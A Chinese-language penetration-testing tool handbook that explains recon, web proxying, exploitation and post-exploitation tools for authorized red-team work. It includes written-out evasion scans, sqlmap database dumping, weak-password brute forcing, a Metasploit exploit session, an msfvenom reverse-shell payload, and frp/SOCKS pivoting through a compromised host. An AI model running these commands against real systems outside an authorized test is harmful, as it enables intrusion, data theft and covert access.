# VOL-06 工具链详解手册

> 受众：5 年源码审计/产品安全经验、刚转岗渗透测试的一人红队工程师。本卷解决"工具怎么选、怎么用、输出怎么读"；漏洞原理见（VOL-01-web-app-part1、VOL-02-web-app-part2），方法论与交付见（VOL-07-08-methodology-reporting），客户端逆向见（VOL-05-client-package）。**所有命令仅用于已签授权书（Rules of Engagement, RoE）范围内的目标。**

## 目录
1. 侦察组：nmap / httpx / ffuf（字典工程）/ OneForAll
2. Web 代理组：Burp Suite / mitmproxy
3. 验证利用组：sqlmap / nuclei（自定义模板）/ fscan、vulmap
4. 后渗透组：Metasploit / CobaltStrike（概念与边界）/ frp
5. 辅助组：CyberChef / 代码执行环境 / 笔记与截图规范
6. 工具组合战术矩阵

---

## 1. 侦察组

### 1.1 nmap —— 端口与服务侦察基座
定位：黑盒第一步，回答"目标开了什么门、门后是什么服务"。

【原理】默认 SYN 半开扫描（`-sS`）：只发 TCP 握手前两步，收到 SYN/ACK 即判开放并 RST 断开，主机应用层多半无感知。`-sV` 服务识别：向开放端口发协议探针（probe），响应与签名库 `nmap-service-probes` 比对推出服务与版本。脚本引擎（Nmap Scripting Engine, NSE）是内嵌 Lua 虚拟机：脚本按分类（safe/version/vuln/exploit/brute 等）组织，可读取已探测的端口与服务信息，实现"发现 80 端口自动跑 http 检测"这类联动。

【操作】安装：macOS `brew install nmap`；Debian/Ubuntu `sudo apt install nmap`（脚本在 `/usr/share/nmap/scripts`，brew 装在其前缀下）。

```bash
# 0) 存活探测，先圈 IP 范围（不扫端口）
nmap -sn 192.168.10.0/24 -oA recon/ping
# 1) 全端口 TCP + 服务版本 + 三格式输出
sudo nmap -sS -sV -p- 192.168.10.5 -oA recon/full_tcp
# 2) NSE 漏扫类脚本（含 intrusive，注意范围）
sudo nmap -sV --script vuln 192.168.10.5 -oA recon/nse_vuln
# 3) 定向 Web 信息收集
sudo nmap --script http-title,http-enum,http-server-header -p 80,443 192.168.10.5
# 4) 给脚本传参 & 更新脚本库
sudo nmap --script smb-vuln-ms17-010 --script-args 'smbusername=admin,smbpassword=xxx' 192.168.10.5
nmap --script-updatedb
# 5) 时机与防火墙绕过：慢速+分片+诱饵+源端口伪装
sudo nmap -sS -T2 --max-rate 100 -f -D RND:6 --source-port 53 --data-length 64 -p 1-1000 192.168.10.5
```

【验证】`-oA` 同时生成 `.nmap`（人读）、`.gnmap`（grep 友好）、`.xml`（程序解析）。`-sV` 命中时端口行形如 `80/tcp open http Apache httpd 2.4.49 ((Unix))`——版本号是后续选 exploit 的直接输入。NSE 结果以 `|` 前缀缩进在端口行下，如 `| smb-vuln-ms17-010: ... VULNERABLE`。XML 进报告比对表。

【陷阱】只扫 TCP 会漏 UDP（SNMP/NTP 在那）：另跑 `sudo nmap -sU --top-ports 50`，UDP 更慢要单独排期。不加 `sudo` 时 `-sS` 静默降级为全连接 `-sT`，更吵。`-T4/-T5` 留给靶场，客户环境 `-T2~T3` + `--max-rate`，IPS 告警阈值要写进 RoE。`-D RND:6` 诱饵只在日志层稀释，骗不过有状态防火墙。CDN/WAF 后的域名扫端口意义有限——先用 1.2 的 httpx 过滤出真实 IP。

### 1.2 httpx —— 存活与指纹批量探测
定位：给大列表（域名/IP/URL）做"谁活着、什么站、什么技术栈"的快速过滤。

【原理】projectdiscovery 出品的 Go 探测器：并发发 HTTP(S) 探测（https 失败自动回退 http），按需提取状态码、标题（Title）、Web 服务器、技术栈指纹、IP/CNAME、CDN 归属；基于 retryablehttp 做重试退避，适合上万行输入。

【操作】
```bash
go install github.com/projectdiscovery/httpx/cmd/httpx@latest   # 或 brew install httpx
# 管道：子域 -> 存活+指纹+CDN 标记+JSON 落盘
cat subs.txt | httpx -title -tech-detect -status-code -ip -cdn -json -o live.json
# 单目标 / 内网常见 Web 端口
httpx -u https://target.example.com -title -tech-detect
httpx -l hosts.txt -ports 80,443,8000,8080,8443 -threads 30 -rate-limit 50
```
官方文档：https://docs.projectdiscovery.io/tools/httpx/

【验证】终端每行一个存活目标，形如 `https://a.target.com [200] [XX后台登录] [nginx] [1.2.3.4]`；`-json` 每行一个对象，`jq -r 'select(.status_code==200) | .url' live.json` 直接筛。标了 CDN 的目标从 nmap 端口扫描清单剔除。

【陷阱】通配符 DNS（wildcard DNS）会把全部子域解析到同一 IP，先看 `-ip` 聚类再去重，否则后续工具全打在同一台机器。默认只探 80/443，内网必须 `-ports`。大列表不配 `-rate-limit` 会打爆 WAF，留一堆 429 污染客户日志。

### 1.3 ffuf —— 内容发现与字典工程
定位：Web Fuzz 主力：目录/文件、参数名、参数值、虚拟主机（vhost）。

【原理】把 URL 中 `FUZZ` 占位符替换为字典项并发请求；核心是校准（calibration）：先用随机字符串测出"软 404"（自定义错误页、全站跳转）的状态码/长度基线，`-ac` 据此自动过滤，剩下的才可信。

【操作】
```bash
go install github.com/ffuf/ffuf/v2@latest    # 或 brew install ffuf
git clone --depth 1 https://github.com/danielmiessler/SecLists ~/tools/SecLists
# 目录发现（自动校准，递归 2 层）
ffuf -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
     -u https://target.example.com/FUZZ -ac -mc 200,301,302,403 \
     -recursion -recursion-depth 2 -of json -o recon/dirs.json
# GET 参数名发现（匹配报错词）
ffuf -w ~/tools/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
     -u 'https://target.example.com/api/FUZZ' -ac -mr 'error|exception'
# vhost：爆破 Host 头，-fs 填基线响应大小
ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u https://target.example.com -H 'Host: FUZZ.target.example.com' -fs 1234
# 定制字典：抓目标页面词语 + 通用字典合并去重
cewl -d 2 -w /tmp/site.dict https://target.example.com
sort -u /tmp/site.dict ~/tools/SecLists/Discovery/Web-Content/raft-medium-words.txt > dicts/target.words
```
SecLists 结构速记：`Discovery/Web-Content/`（目录/文件/参数名，raft-* 按命中率分级）、`Discovery/DNS/`（子域）、`Passwords/`、`UserNames/`。字典工程原则：**定制 > 通用**——从 JS、接口路径、客户业务词提炼的小字典，比超大字典省时间、少告警、高命中。

【验证】`-o dirs.json -of json` 的 `results` 数组含 input/status/length/words；终端实时表看 `Status`/`Size` 列离群值——多数行是统一 404 尺寸时，异常状态码/长度即候选入口。

【陷阱】忘 `-ac`/`-fs` 时满屏软 404，新手第一大坑；反之 `-ac` 偶尔滤掉与 404 同尺寸的真页面，重要目标手动放宽复核。递归是指数级流量：先 medium 后 large、命中子目录再深挖。WAF 目标配 `-rate 50` 和浏览器 UA。URL 不含 `FUZZ` 会直接报错——这是设计。

### 1.4 子域收集：OneForAll + subfinder
定位：划定攻击面（Attack Surface）第一步：授权主域下有哪些子域。

【原理】OneForAll 聚合多源：子域字典爆破、证书透明度（Certificate Transparency, CT）日志、第三方 API（在 `config/api.py` 配 key）、DNS 数据集，再做解析与存活校验；subfinder 走纯被动源，无发包。原则**先被动后主动**：被动零告警。

【操作】
```bash
# OneForAll（Python3）
git clone https://github.com/shmilylty/OneForAll.git && cd OneForAll
pip3 install -r requirements.txt
python3 oneforall.py --target example.com run       # 单域名
python3 oneforall.py --targets ./domains.txt run    # 批量
# 结果：results/example.com.csv；汇总 all_subdomain_result_*.csv

# 被动轮：subfinder
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
subfinder -d example.com -silent > subs.txt
cat subs.txt | httpx -title -json -o live.json      # 接 1.2 存活筛选
```

【验证】`example.com.csv` 含子域、解析 IP、CNAME 列；两工具合并去重后数量级与客户资产清单对得上，差太多先查通配符 DNS。

【陷阱】OneForAll 不配第三方 API key 结果明显偏少；仓库久未大更新，依赖装不上就退回 subfinder + CT 日志方案。爆破类收集会对权威 DNS 产生查询流量，确认授权范围覆盖 DNS。

## 2. Web 代理组

### 2.1 Burp Suite —— Web 测试工作台
定位：Web 打点主战场：看包、改包、重放、批量、扫描。

【原理】本机 127.0.0.1:8080 起代理监听，浏览器流量经它中转；HTTPS 靠 Burp 动态签发的 CA 证书（Certificate Authority, CA）做中间人（Man-in-the-Middle, MITM）解密——所以必须先信任 Burp CA。所有经手流量进 HTTP history，任意请求可右键送往 Repeater/Intruder/Scanner 复用。

【操作】
1. 安装：官网下载 Community（免费）或 Pro（付费，解锁主动扫描与 Intruder 全速）。
2. Proxy → Proxy settings → Proxy listeners 确认 `127.0.0.1:8080` 为 Running。
3. 浏览器接代理：推荐 Firefox + FoxyProxy 按模式切换；或直接用内置浏览器（Proxy → Intercept → Open browser，免配代理与证书）。
4. 证书安装逐步（独立 Firefox 为例）：a) 保持代理开启，访问 `http://burp`；b) 点右上 "CA Certificate" 下载 `cacert.der`；c) Firefox 设置 → 隐私与安全 → 证书 → 查看证书 → 导入 → 选 cacert.der → 勾"信任由此证书颁发机构来标识网站"；d) 访问任意 https 站点无告警即成功。（Chrome/macOS 走系统钥匙串导入并设"始终信任"。）
5. 模块正确定位：**Proxy**=流量闸门，打点期关 Intercept 只积累 history；**Repeater**=手工重放微调，你 80% 时间在这，配合 VOL-01/02 漏洞原理验证；**Intruder**=批量变体，四模式：Sniper（单字典逐位）、Battering ram（同字典打多位）、Pitchfork（多字典平行）、Cluster bomb（多字典全组合），社区版限速所以批量活交 ffuf；**Scanner**（Pro）=Dashboard → New scan，开扫前先设 Target scope 只含授权域；Decoder/Comparer/Sequencer 编解码、比对、随机性检查。
6. 联动 sqlmap：HTTP history 选中请求 → 右键 "Copy to file" 存 `req.txt` → `sqlmap -r req.txt --batch`（Cookie/头全保留，见 3.1）。
7. 常用 BApp 扩展：ActiveScan++（增强主动扫描）、Autorize（越权自动化）、Turbo Intruder（高速大字典）、Logger++（流量过滤导出）、HaE（敏感信息高亮）、JS Miner（JS 中的接口与密钥，配合 VOL-05 思路）。

【验证】代理生效判据：HTTP history 持续出现请求-响应对，Intercept 开启时浏览器挂起；证书判据：https 无告警且 history 里是明文。

【陷阱】系统全局代理会劫持其他工具流量，用 FoxyProxy 分模式。不设 Scope 开 Scanner 会扫到第三方资源（越界+浪费）。Intruder 忘记 URL 编码选项，% 破坏请求结构。换机器/证书过期后忘重装，排障先访问 `http://burp` 确认连通。

### 2.2 mitmproxy —— 脚本化中间人代理
定位：Burp 的命令行互补件，强项**可编程**：批量改包、自动校验、App/小程序抓包。

【原理】同为 MITM 代理，但交互模型是"插件（addon）+ 事件钩子（hook）"：Python 文件定义 `request(flow)`/`response(flow)`，每个流经过时被回调，直接改写请求/响应。

【操作】
```bash
brew install mitmproxy          # 或 pip install mitmproxy
mitmweb                          # Web 界面：http://127.0.0.1:8081
mitmdump -s addon.py --listen-port 8080
```
`addon.py` 示例（定向加头 + 响应打标）：
```python
from mitmproxy import http

def request(flow: http.HTTPFlow):
    if flow.request.pretty_host == "api.target.example.com":
        # 测试 X-Forwarded-For 类信任绕过
        flow.request.headers["X-Forwarded-For"] = "127.0.0.1"

def response(flow: http.HTTPFlow):
    if "debug" in flow.response.text:
        flow.response.headers["X-Leak-Debug"] = "1"
```
手机抓包：设备 Wi-Fi 代理指向本机 8080，设备浏览器访问 `http://mitm.it` 装证书。

【验证】mitmweb 界面出现 flows 且能看内容；脚本内 `print()` 打到 mitmdump 终端；flow 详情里核对你注入的头是否生效。

【陷阱】Android 7+ 默认不信任用户证书，App 的 HTTPS 需系统级证书（root），未授权设备别碰——很多 App 直接走 VOL-05 静态逆向拿服务端地址更快。脚本异常会静默丢流量：前台跑盯 stderr。大流量卡界面用过滤表达式如 `~u api.target`。

## 3. 验证利用组

### 3.1 sqlmap —— SQL 注入验证与提数
定位：把手工确认的注入点自动化：指纹、提数、绕 WAF。**只对授权数据**。

【原理】对参数注入探测载荷，覆盖五类判定：报错型（error-based，看 DB 错误回显）、布尔盲注（boolean-blind，对比真假响应差异）、时间盲注（time-based，用延迟推断）、UNION 联合（探测列数与回显位）、堆叠查询（stacked queries）。确认后按数据库（DBMS）方言构造提数语句。它不懂你业务的边界，范围全靠你给。

【操作】
```bash
brew install sqlmap    # 或 apt install sqlmap
# 1) 最稳姿势：Burp 导出的请求文件（Cookie/头完整）
sqlmap -r req.txt --batch --level 3 --risk 2
# 2) 单参数指定
sqlmap -u "https://target.example.com/item?id=1" -p id --batch
# 3) POST 表单
sqlmap -u "https://target.example.com/login" --data "u=a&p=b" -p u --batch
# 4) 提数链路：库 -> 表 -> 数据
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D webapp --tables
sqlmap -r req.txt --batch -D webapp -T users --dump
# 5) 绕 WAF/降速（生产必配）
sqlmap -r req.txt --batch --tamper=space2comment,between --random-agent --delay 2 --threads 1
# 6) 联动 Burp 观察流量
sqlmap -r req.txt --batch --proxy http://127.0.0.1:8080
```

【验证】命中先出 `parameter 'id' is vulnerable` 与后端 DBMS 指纹（如 MySQL）；`--dump` 的 CSV 落在 `~/.sqlmap/output/<目标>/dump/`——报告证据直接来源。`--level`≥3 才测 HTTP 头（Cookie/UA）注入，`--risk`≥2 增加 OR 型等激进 payload。

【陷阱】时间盲注大量 SLEEP 会拖垮小站连接池：生产 `--delay 2 --threads 1` 并约时间窗。`--dump` 仅在授权允许取数时用；合规做法是 `--schema`/`--count` 级别的取证输出即可（以授权书为准）。tamper 无万能组合，先看 WAF 拦截特征再选。请求文件里压缩头（`Accept-Encoding: gzip`）偶尔干扰解析，报错时删掉重试。sqlmap 不是发现器：先在 Repeater 手工确认可疑点再交给它。

### 3.2 nuclei —— 模板化漏洞扫描
定位：批量、可复现的已知漏洞（CVE/指纹/泄露）验证器。

【原理】引擎与 YAML 模板分离：模板定义"发什么请求+怎么判定（matcher）+怎么提取（extractor）"，引擎并发渲染执行；官方模板库持续更新。模板即代码：可版本化、可自定义，交付时能精确复述检测逻辑。

【操作】
```bash
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest  # 或 brew install nuclei
nuclei -update-templates
nuclei -l live.txt -severity critical,high -o recon/nuclei_high.txt
nuclei -l live.txt -tags cve -etags dos    # 排除拒绝服务类
```
自定义模板最小样例（v3 语法，请求根键为 `http:`）：
```yaml
id: target-backup-exposure
info:
  name: Backup file exposure on target
  severity: medium
  tags: exposure
http:
  - method: GET
    path:
      - "{{BaseURL}}/backup.zip"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/zip"
```
```bash
nuclei -t templates/backup.yaml -u https://target.example.com   # 本地验证模板
```
自定义流程：Burp 历史复制原始请求 → 路径/参数改 `{{BaseURL}}` 占位 → 双条件 matcher（状态码+内容/头特征）→ 先对靶场验证再上线。

【验证】命中输出形如 `[target-backup-exposure:backup-file-exposure] [medium] [http] [https://target.example.com/backup.zip]`；`-j` 出 JSON 进 jq 汇总。模板本地跑通 = 你能对客户解释"怎么测出来的"。

【陷阱】matcher 只配 200 必误报（软 404 也 200）——至少双条件。模板库滞后于新 CVE：高危新洞照官方公告思路自己写。主动/破坏类模板对生产危险，显式排除。结论措辞是"覆盖范围内未发现"而非"安全"（见 VOL-07-08）。

### 3.3 fscan / vulmap —— 内网与组件一键侦察
定位：拿到内网立足点（或授权内网段）后的第一轮广度扫描。

【原理】fscan（Go 单二进制）：ICMP 存活 → TCP 常用端口（内置百余个）→ 服务/指纹识别 → 对可爆破服务跑内置弱口令、对已知漏洞（MS17-010、Redis 未授权等）跑 POC，部分可继续利用。vulmap（Python）：面向 Web 中间件/框架（weblogic/tomcat/fastjson/shiro/spring 等）的漏洞比对+验证。共性：快、全、吵。

【操作】
```bash
# fscan：官方 Release 下载对应平台二进制
./fscan -h 192.168.10.0/24                 # C 段全流程
./fscan -h 192.168.10.0/24 -ao             # 只做存活探测，先摸底
./fscan -h 192.168.10.5 -p 22,80,443,3389 -nobr   # 指定端口+禁爆破（防账号锁定）
./fscan -u http://192.168.10.5             # 单 Web 目标
./fscan -h 192.168.10.5 -m ssh -user root -pwd 'password1'   # 单模块定向
# vulmap
git clone https://github.com/zhzyker/vulmap.git && cd vulmap
pip3 install -r requirements.txt
python3 vulmap.py -u http://192.168.10.5:8080
```

【验证】fscan 按主机分段输出端口、标题/指纹、命中漏洞与弱口令，并写入结果文件；vulmap 命中输出漏洞名、编号与验证证据。两者输出都是**线索清单**：逐条回 nmap 精扫 / Burp / 手工 POC 复核。

【陷阱】噪音与破坏是主陷阱：弱口令爆破可能锁死域账号、触发 SIEM 应急。铁律：(1) 授权书明确允许 (2) 与客户约定时间窗 (3) `-nobr` 起步 (4) 控制线程与网段。fscan 判定基于内置 POC 快照，误报漏报都常见，命中必须手工复核才进报告。vulmap 更新缓慢，只当组件快速比对，结论以官方公告 PoC 为准（以官方仓库为准：https://github.com/zhzyker/vulmap ）。在授权边界外网段跑 = 越界红线。

## 4. 后渗透组

### 4.1 Metasploit —— 利用与后渗透框架
定位：模块化利用与后渗透（post-exploitation）工具箱，内网横向的"瑞士军刀"。

【原理】六类模块：auxiliary（扫描/嗅探等辅助）、exploit（利用链）、payload（利用成功后执行的载荷：普通 shell 或 meterpreter）、post（后渗透：信息收集/提权辅助）、encoder、evasion。每个 exploit 有前置条件（版本、路径、认证状态），不满足即失败——先侦察后利用。meterpreter 是内存驻留的多功能 shell：注入方式运行、不新起落盘进程，提供 `sysinfo`、`getuid`、口令转储、内网路由等能力。框架自带 PostgreSQL 工作区记录 hosts/services/creds。

【操作】
```bash
brew install metasploit    # 或 Kali 自带
msfconsole
```
会话内标准流程（示例：Tomcat 管理台上传）：
```
search type:exploit name:tomcat
use exploit/multi/http/tomcat_mgr_upload
show options          # Required 列为空的全部要 set
set RHOSTS 192.168.10.5
set LHOST 192.168.56.1        # 你的回连地址（目标可达）
exploit
# 成功进入 meterpreter >
sysinfo
getuid
```
独立载荷生成（仅授权分发场景）：
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o /tmp/shell.elf
```
内网跳板（拿到内网 meterpreter 后）：
```
run post/multi/manage/autoroute -s 192.168.10.0/24   # 以失陷主机为路由
background
use auxiliary/server/socks_proxy
set VERSION 5
run
```
之后本机 `proxychains` + 任意工具即可达内网（隧道另见 4.3）。

【验证】`exploit` 成功标志是 `meterpreter >` 提示符与 `sysinfo` 输出；auxiliary 跑完出摘要；`hosts`/`services` 可查累积资产。

【陷阱】NAT 后拿错 LHOST（如 127.0.0.1）回连必败：LHOST 必须是目标可达的你的地址（VPN tun0/公网 VPS）。目标有 EDR 时 meterpreter 常被拦截：降级普通 `shell` 载荷或先做免杀评估。不 `show options`/`show missing` 就 exploit，多半参数不全。autoroute 后忘开 socks_proxy 或 proxychains 未配，会误判"内网不通"。后渗透每个动作对应授权范围，横向移动要单独确认（见 VOL-07-08）。

### 4.2 CobaltStrike —— 概念认知与授权边界
定位：商业 C2（Command & Control，命令与控制）框架、红队协同平台。本节只建概念与合规边界，不教操作。

【原理】架构：Team Server（服务端：监听器管理、任务分发、日志留存）+ Beacon（植入体：按 sleep+jitter 周期回连，可配置流量节奏；Malleable C2 Profile 定制流量特征伪装成合法协议）。多人共享会话视图，这是它与单机工具的本质差别。

【操作/边界】正版授权（Fortra 商业许可）+ 客户书面授权（RoE 列明时间窗、目标、C2 域名/IP、允许动作）是硬前提，缺一即违法（刑法 285/286 红线）。练手用官方培训材料或自建授权靶场理解 Beacon 回连与监听器；无预算时开源替代（Havoc、Sliver、MSF）覆盖同等训练目标。

【验证】概念自检达标线：能说清 Team Server/Beacon/Profile 三者职责，以及"为什么回连周期与抖动影响被检测概率"。

【陷阱】网上"破解版/汉化版"是供应链投毒重灾区，下载即失陷且使用违法。C2 基础设施未列入授权附录 = 越界。一人红队前期用不上：MSF + frp 覆盖绝大多数授权测试场景。

### 4.3 frp —— 内网穿透隧道
定位：把内网服务/socks 代理反向暴露到你的 VPS，解决"目标在内网、我在外面"。

【原理】反向隧道：内网侧 frpc 主动连公网 frps 建立控制连接；外部访问 frps 的 remotePort，流量经隧道转发到 frpc 侧 localPort。类型支持 tcp/udp/http/https 及插件（plugin）扩展，socks5 插件可把失陷主机变成公网代理跳板。配置格式已从 ini 过渡到 TOML。

【操作】官方 Release 下载（含 frps/frpc）。VPS 上 `frps.toml`：
```toml
bindAddr = "0.0.0.0"
bindPort = 7000
auth.token = "换32位以上随机串"
webServer.addr = "0.0.0.0"     # 管理面板，公网暴露必须强口令
webServer.port = 7500
webServer.user = "admin"
webServer.password = "换掉"
```
```bash
./frps -c frps.toml
```
内网主机 `frpc.toml`：
```toml
serverAddr = "你的VPS公网IP"
serverPort = 7000
auth.token = "同上"

# 内网 RDP 转到 VPS 的 13389
[[proxies]]
name = "rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 13389

# 把失陷主机变成公网 socks5 代理
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"
username = "随机用户"
password = "随机密码"
```
```bash
./frpc -c frpc.toml
# 你本机经代理扫内网
proxychains nmap -sT -Pn 192.168.10.0/24 -p 80,445,3389
```

【验证】frpc 日志出现 `login to server success`；VPS `ss -lntp | grep 13389` 在听；`proxychains curl http://内网地址` 有响应即链路通；frps 面板（7500）看代理与流量状态。

【陷阱】公网裸 frps 是扫描器重点：强 token + 非默认端口 + 面板强口令；历史版本有已知 RCE，**始终用最新版**。隧道用于客户环境前确认 RoE 允许"流量中转/VPS 出口"，VPS IP 列入授权附录。敏感场景客户端加 `transport.tls.enable = true`（以官方文档为准：https://github.com/fatedier/frp ）。nmap 走 socks 只支持全连接扫描（`-sT -Pn`），SYN 扫描不走代理，别误判"端口全关"。

## 5. 辅助组

### 5.1 CyberChef —— 编解码瑞士军刀
【原理】纯前端实现数百种运算操作（Operation），拖拽组成处理流水线（Recipe）；完全离线可用，数据不出本机——这是对在线工具的合规优势。
【操作】官方 Release 下载 zip 解压，浏览器打开 `CyberChef.html` 即可（https://github.com/gchq/CyberChef ）。常用：Magic（自动识别多层编码）、From Base64、URL Decode、JWT Decode（解 JWT 结构，配合 VOL-01 鉴权章节）。Recipe 可导出为 URL 分享复现。
【验证】对一段 JWT/Base64 输入能一步还原明文即正常。
【陷阱】操作参数选错（Base64 字母表变体、字符串 vs Hex 输入）是排障第一现场；官方在线版方便但敏感数据务必用离线版。

### 5.2 代码执行环境 —— PoC 与自动化工位
【原理】渗透一半的工作是一次性胶水代码：改包重放、结果清洗、工具串联。虚拟环境（venv）隔离依赖，脚本与命令同存入案例笔记保证可复现。
【操作】
```bash
python3 -m venv ~/.venvs/redteam && source ~/.venvs/redteam/bin/activate
pip install requests beautifulsoup4 pyyaml
```
PoC 模板三件套（Session 复用连接、显式关闭校验注明原因、断言产出证据）：
```python
import requests
s = requests.Session()
s.headers["User-Agent"] = "redteam-authorized-test"
r = s.get("https://target.example.com/api/v1/user/1", verify=False, timeout=10)
assert r.status_code == 200
print(r.text[:200])   # 证据输出，随后截图入笔记
```
JSON 处理：`jq -r '.[] | select(.status_code==200) | .url' live.json`。
【验证】在靶场对已知接口跑通"请求→断言→证据"全链路一次。
【陷阱】PoC 硬编码生产地址被他处误触发；venv 忘激活污染全局；`verify=False` 提交进正式工具库（应做成显式开关）。

### 5.3 笔记与截图规范 —— 交付的另一半
【原理】报告的证据链只能来自测试当下（交付篇见 VOL-07-08）。笔记即报告草稿：每个发现（finding）一张卡，测完卡齐报告就齐。
【操作】本地 Markdown（Obsidian/VS Code）每项目一仓：`notes/`（过程）、`evidence/`（截图）、`poc/`（脚本）。案例卡固定字段：时间/资产/工具命令/输出/截图编号/影响初判。截图规范五条：
1. 全屏或含完整地址栏，可辨识协议+域名+路径；
2. Burp 证据请求与响应成对（Raw 视图）；
3. 命令行证据含完整命令与关键输出行；
4. 画面留系统时间（时间戳举证）；
5. 命名 `YYYYMMDD_HHmm_target_caseNo_desc.png`，与案例卡互引。
【验证】抽查任一 finding：只看笔记+截图，第三方能复述"怎么发现的、影响是什么"。
【陷阱】事后补截图（时间戳对不上是硬伤）；截图泄露客户业务数据（口令打码保留证据效力，如仅露前 3 后 2 位）；工具输出无上下文（只有状态码没有 URL 等于没证据）。

## 6. 工具组合战术矩阵

| 场景 | 工具链 | 关键输出物 |
|---|---|---|
| 外网资产测绘 | subfinder/OneForAll → httpx 存活指纹 → nmap -sV（真实 IP） | 存活资产表（url/title/技术栈/IP/端口） |
| Web 打点 | ffuf 目录+参数 → Burp Repeater 手工验证 → sqlmap -r 提数 | finding 卡 + 请求响应证据对 |
| 已知漏洞批量验证 | httpx → nuclei（高危过滤）→ 命中项手工复核 | 高危漏洞清单（附模板依据） |
| App/客户端攻击面 | VOL-05 逆向提取服务端 → mitmproxy 抓包 | API 接口清单 + 通信结构 |
| 内网首探 | fscan -ao 摸底 → fscan -nobr 定向 → nmap 精扫 | 去噪后的内网服务清单 |
| 横向与跳板 | msf autoroute + socks_proxy 或 frp socks5 → proxychains | 可达性验证记录 + 隧道拓扑 |
| 证据整理 | CyberChef/jq 清洗 → 笔记卡+截图规范 | 报告附录证据包（见 VOL-07-08） |

> 一人红队心法：每条链路的最后一站永远是"证据落盘"。工具只是把发现变成可交付输出的管道——发现不了价值的不是工具差，是链路没接到交付物上。
